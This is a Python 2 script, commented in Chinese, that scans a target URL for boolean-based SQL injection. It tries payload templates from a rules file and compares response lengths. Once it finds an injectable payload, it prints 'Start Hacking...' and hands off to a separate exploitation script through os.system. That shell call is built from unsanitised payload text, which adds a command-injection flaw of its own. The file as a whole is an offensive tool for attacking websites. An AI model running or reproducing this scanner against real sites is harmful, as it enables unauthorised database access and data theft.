#!/usr/bin/env python
# encoding:utf8

import requests
import sys
import os
import urllib
import binascii
import base64

if len(sys.argv) != 2:
    print "Usage : " + "python " + sys.argv[0] + " [URL]"
    print "Example : python " + sys.argv[0] + " \"http://www.xxx.com/index.php?id=1\""
    exit(1)

def urlEncodeAllChar(content):
    temp = {'id':content}
    tempUrl = urllib.urlencode(temp)
    return tempUrl.split("=")[1]

def getHexChar(content):
    return binascii.b2a_hex(content)

def getEscapeChar(content): # 这里只是基于规则的替换 , 并不完善
    content = content.replace("\\","\\\\") # 顺序很重要 , 转义替换转义字符\必须放在第一个
    content = content.replace("'","\\'")
    content = content.replace("\"","\\\"")
    return content

def urlEncodeQuote(content):
    return content.replace("'","%27")

url = sys.argv[1]
baseUrl = url.split("=")[0] + "="
# 截取用户输入URL中的参数的值
currentQuery = url.split("=")[1] # 正确的查询参数
print "----------------------"
print "Checking : " + url
print "----------------------"
counter = 0
payloads = []
rules = open('rules', 'r')
wrongQuery = "-1" # 正确的查询参数 # TODO 这里是否也需要作为参数提取出来
url = baseUrl + currentQuery
contentLength = len(requests.get(url).text)
for line in rules:
    if line.startswith("#"):
        continue
    if line == "\r\n":
        continue
    line = line.replace("\r","")
    line = line.replace("\n","")
    print "Trying : " + line
    line = urlEncodeAllChar(line)
    startTemp = line.split(urlEncodeAllChar("()"))[0]
    endTemp = line.split(urlEncodeAllChar("()"))[1]
    # print endTemp
    payload1 = startTemp + "(" + wrongQuery + ")" + endTemp
    testUrl1 = baseUrl + payload1
    payload2 = startTemp + "(" + currentQuery + ")" + endTemp
    testUrl2 = baseUrl + payload2
    content1 = requests.get(testUrl1).text
    content1 = content1.replace(payload1,currentQuery)
    content1 = content1.replace(getHexChar(urllib.unquote(payload1)),currentQuery) # 替换掉Hex字符
    content1 = content1.replace(getEscapeChar(urllib.unquote(payload1)),currentQuery) # 替换掉转义字符
    content1 = content1.replace(base64.b64encode(urllib.unquote(payload1)),currentQuery) # 替换掉Base64编码
    content1 = content1.replace(urllib.unquote(payload1),currentQuery) # 替换掉URL编码
    len1 = len(content1)
    content2 = requests.get(testUrl2).text
    content2 = content2.replace(payload2,currentQuery)
    content2 = content2.replace(getHexChar(urllib.unquote(payload2)),currentQuery) # 替换掉Hex字符
    content2 = content2.replace(getEscapeChar(urllib.unquote(payload2)),currentQuery) # 替换掉转义字符
    content2 = content2.replace(base64.b64encode(urllib.unquote(payload2)),currentQuery) # 替换掉Base64编码
    content2 = content2.replace(urllib.unquote(payload2),currentQuery) # 替换掉URL编码
    # print getHexChar(urllib.unquote(payload2))
    # print getEscapeChar(urllib.unquote(payload2))
    # print content2
    len2 = len(content2)
    if (len1 != contentLength) and (len2 == contentLength):
        baseUrl = urllib.unquote(baseUrl)
        line = urllib.unquote(line)
        payload = baseUrl + line
        payloads.append(line)
        counter += 1
        print payload
        break
print "----------------------"
print counter," valunable found!"
print "----------------------"
if counter != 0:
    print "Start Hacking..."
    # 添加转义
    hack_payload = payloads[0]
    hack_payload = hack_payload.replace("\"","\\\"")
    command = "python boolInject.py \"" + hack_payload + "\" \"" + baseUrl + "\" \"" + currentQuery + "\""
    print "Exce : " + command
    os.system(command)
